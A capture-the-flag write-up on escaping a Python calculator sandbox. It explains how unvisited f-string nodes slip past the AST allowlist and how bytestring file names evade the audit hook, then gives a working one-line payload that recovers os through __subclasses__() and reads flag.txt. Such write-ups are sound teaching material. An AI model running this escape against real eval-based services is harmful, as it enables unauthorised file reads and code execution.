# pCalc

The script accepts user input, validates it against a strict allowlist of Abstract Syntax Tree nodes (allowing only basic arithmetic), and then executes it using eval() with empty globals.

Additionally, a Python Audit Hook is installed to block:

- Process execution (os.system, subprocess.Popen, etc.).
- File access if the filename contains "flag".

```c
class Calculator(ast.NodeVisitor):
    def visit(self, node):
        # 1. Allow specific nodes and continue recursion
        if isinstance(node, (ast.Module, ast.Expr, ast.BinOp, ...)):
            super().visit(node)
            
        # 2. Allow f-strings (JoinedStr), skips recursive node visit
        elif isinstance(node, ast.JoinedStr):
            pass 
            
        else:
            self.is_valid = False
```

The script allows numerical nodes, and f-strings but  forgets to visit it’s subnodes, effectively bypassing the AST verification.

```c
def audit_hook(event, args):
    # Blocks opening files with 'flag' in the name
    if event == 'open' and isinstance(args[0], str) and 'flag' in args[0]:
        raise RuntimeError("Forbidden File Access")
```

There is a  vulnerability in the audit hook, which forgets to check for flag if it is sent as a bytestring.

Builtins are also removed, and there is  input filter for  import. We can recover the os module by walking up the class hierarchy to find the BuiltinImporter module, and bypass the string keyword checks by splitting it.

### Final solution

```c
f"{[(os:=c.load_module('os')).write(1, os.read(os.open(b'flag.txt',0),999)) for c in ().__class__.__base__.__subclasses__() if c.__name__=='BuiltinImp'+'orter']}"
```